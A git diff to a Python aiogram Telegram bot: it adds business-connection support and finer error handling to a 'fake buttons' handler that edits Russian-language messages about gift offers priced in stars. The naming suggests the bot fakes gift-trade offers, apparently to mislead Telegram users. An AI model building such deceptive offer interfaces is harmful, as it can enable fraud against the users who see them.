@@ -3,6 +3,7 @@ import os
 import re
 from aiogram import Bot, Dispatcher, types, F
 from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, LinkPreviewOptions
+from aiogram.exceptions import TelegramBadRequest
 
 BOT_TOKEN = os.getenv("BOT_TOKEN")
 
@@ -100,21 +101,39 @@ async def handle_fake_buttons(callback: types.CallbackQuery):
             new_text = f"❌ Оффер на <b>{amount} ⭐</b> за подарок <a href='{link}'>{pretty_name}</a> отклонен."
             new_keyboard = None
 
-        # Пытаемся отредактировать сообщение
-        await bot.edit_message_text(
-            text=new_text,
-            chat_id=callback.message.chat.id,
-            message_id=callback.message.message_id,
-            reply_markup=new_keyboard,
-            parse_mode="HTML",
-            link_preview_options=LinkPreviewOptions(is_disabled=True)
-        )
-        await callback.answer() # Успешно
+        # Получаем business_connection_id из сообщения, которое редактируем
+        business_connection_id = callback.message.business_connection_id
 
-    except Exception as e:
-        # ВЫВОДИМ РЕАЛЬНУЮ ОШИБКУ, чтобы понять, почему не редактируется
-        print(f"!!! РЕАЛЬНАЯ ОШИБКА РЕДАКТИРОВАНИЯ: {e} !!!")
+        # Если по какой-то причине его нет, пробуем отредактировать без него (для обычных чатов)
+        if business_connection_id:
+            await bot.edit_message_text(
+                text=new_text,
+                chat_id=callback.message.chat.id,
+                message_id=callback.message.message_id,
+                business_connection_id=business_connection_id,
+                reply_markup=new_keyboard,
+                parse_mode="HTML",
+                link_preview_options=LinkPreviewOptions(is_disabled=True)
+            )
+        else:
+            # Резервный вариант для обычных чатов (не бизнес)
+            await bot.edit_message_text(
+                text=new_text,
+                chat_id=callback.message.chat.id,
+                message_id=callback.message.message_id,
+                reply_markup=new_keyboard,
+                parse_mode="HTML",
+                link_preview_options=LinkPreviewOptions(is_disabled=True)
+            )
+
+        await callback.answer()
+
+    except TelegramBadRequest as e:
+        print(f"!!! ОШИБКА РЕДАКТИРОВАНИЯ: {e} !!!")
         await callback.answer(f"Ошибка: {e}", show_alert=True)
+    except Exception as e:
+        print(f"!!! НЕИЗВЕСТНАЯ ОШИБКА: {e} !!!")
+        await callback.answer("Произошла ошибка.", show_alert=True)
 
 async def main():
     print("Бот запущен...")
